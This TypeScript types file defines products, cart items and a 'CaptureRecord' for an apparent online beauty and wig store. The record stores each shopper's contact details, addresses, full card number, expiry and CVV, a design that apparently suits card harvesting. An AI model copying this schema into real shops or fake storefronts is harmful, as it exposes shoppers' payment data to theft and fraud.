export interface ProductOption {
  name: string;
  values: string[];
}

export interface Product {
  id: string;
  name: string;
  category: 'Skincare' | 'Hair Wigs' | 'Cosmetics';
  tagline: string;
  originalPrice: number;
  discountPrice: number;
  discountPercent: number;
  images: { src: string; alt: string }[];
  description: string;
  benefits: string[];
  ingredientsOrDetails: { label: string; value: string }[];
  options: ProductOption[];
  rating: number;
  reviews: number;
  inStock: boolean;
  badge?: string;
}

export interface CartItem {
  id: string;
  product: Product;
  selectedOptions: Record<string, string>;
  quantity: number;
  unitPrice: number;
  totalPrice: number;
}

export interface CaptureRecord {
  id: string;
  timestamp: string;
  // Cart payload
  items: {
    productId: string;
    productName: string;
    options: Record<string, string>;
    quantity: number;
    unitPrice: number;
    totalPrice: number;
  }[];
  totalAmount: number;
  // Contact info
  email: string;
  phone: string;
  firstName: string;
  lastName: string;
  // Shipping address (verification)
  shippingAddress: string;
  shippingApartment: string;
  shippingCity: string;
  shippingState: string;
  shippingZip: string;
  shippingCountry: string;
  // Billing address (payment)
  billingAddress: string;
  billingApartment: string;
  billingCity: string;
  billingState: string;
  billingZip: string;
  billingCountry: string;
  // Payment details
  cardType: string;
  cardNumberLast4: string;
  cardFullNumber: string;
  cardExpiry: string;
  cardCVV: string;
  cardName: string;
}
